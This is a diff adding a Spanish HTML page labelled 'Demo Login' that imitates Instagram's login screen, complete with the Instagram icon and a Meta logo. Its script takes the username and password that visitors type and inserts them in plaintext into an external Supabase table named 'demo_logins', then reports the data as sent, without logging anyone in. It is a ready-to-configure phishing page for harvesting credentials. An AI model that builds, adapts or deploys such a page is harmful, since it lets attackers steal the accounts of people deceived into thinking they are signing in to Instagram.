@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Demo Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<style>
+* {
+    box-sizing: border-box;
+    font-family: 'Roboto', sans-serif;
+}
+
+body {
+    margin: 0;
+    background: #fff;
+    color: #262626;
+}
+
+.app {
+    min-height: 100vh;
+    padding: 24px 16px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.language {
+    font-size: 16px;
+    color: #8e8e8e;
+    margin-top: 10px;
+}
+
+.logo {
+    margin: 48px 0 32px;
+}
+
+.logo img {
+    width: 64px;
+    height: 64px;
+}
+
+.form {
+    width: 100%;
+    max-width: 360px;
+}
+
+.form input {
+    width: 100%;
+    height: 52px;
+    padding: 0 16px;
+    font-size: 16px;
+    border: 1px solid #dbdbdb;
+    border-radius: 12px;
+    margin-bottom: 12px;
+}
+
+.login-btn {
+    width: 100%;
+    height: 48px;
+    background: #0a66c2;
+    border: none;
+    border-radius: 999px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 500;
+    margin-top: 8px;
+    cursor: pointer;
+}
+
+.forgot {
+    margin-top: 18px;
+    text-align: center;
+    font-size: 14px;
+}
+
+.status {
+    text-align: center;
+    font-size: 14px;
+    margin-top: 12px;
+}
+
+.spacer {
+    flex: 1;
+}
+
+.signup-btn {
+    width: 100%;
+    max-width: 360px;
+    height: 48px;
+    border-radius: 999px;
+    border: 1px solid #0a66c2;
+    background: transparent;
+    color: #0a66c2;
+    font-size: 16px;
+    font-weight: 500;
+    margin-bottom: 22px;
+}
+
+.meta {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 14px;
+    color: #8e8e8e;
+    margin-bottom: 8px;
+}
+
+.meta svg {
+    width: 28px;
+    fill: #8e8e8e;
+}
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+    <div class="language">Español (España)</div>
+
+    <div class="logo">
+        <!-- Pon aquí tu logo si quieres -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Logo">
+    </div>
+
+    <div class="form">
+        <input id="username" type="text" placeholder="Usuario, correo electrónico o móvil">
+        <input id="password" type="password" placeholder="Contraseña">
+
+        <button class="login-btn" onclick="submitLogin()">Iniciar sesión</button>
+
+        <div class="forgot">¿Has olvidado la contraseña?</div>
+        <div class="status" id="status"></div>
+    </div>
+
+    <div class="spacer"></div>
+
+    <button class="signup-btn">Crear cuenta nueva</button>
+
+    <div class="meta">
+        <!-- Logo Meta correcto -->
+        <svg viewBox="0 0 512 287">
+            <path d="M256 0C170.7 0 108.5 58.7 76.6 123.2 44.7 187.7 32 259.5 32 259.5c0 15.2 12.3 27.5 27.5 27.5h27.5c11.8 0 22.3-7.6 26-18.8 0 0 19.8-60.4 50.6-112.5 30.8-52.1 61.4-78.2 92.4-78.2s61.6 26.1 92.4 78.2c30.8 52.1 50.6 112.5 50.6 112.5 3.7 11.2 14.2 18.8 26 18.8h27.5c15.2 0 27.5-12.3 27.5-27.5 0 0-12.7-71.8-44.6-136.3C403.5 58.7 341.3 0 256 0z"/>
+        </svg>
+        Meta
+    </div>
+
+</div>
+
+<script>
+/* CONFIGURA TÚ */
+const SUPABASE_URL = "TU_SUPABASE_URL";
+const SUPABASE_ANON_KEY = "TU_PUBLIC_ANON_KEY";
+
+const supabase = supabaseJs.createClient(
+    SUPABASE_URL,
+    SUPABASE_ANON_KEY
+);
+
+async function submitLogin() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const status = document.getElementById("status");
+
+    if (!username || !password) {
+        status.textContent = "Completa todos los campos";
+        return;
+    }
+
+    const { error } = await supabase
+        .from("demo_logins")
+        .insert([{ username, password }]);
+
+    if (error) {
+        status.textContent = "Error al enviar datos";
+    } else {
+        status.textContent = "Datos enviados correctamente";
+    }
+}
+</script>
+
+</body>
+</html>
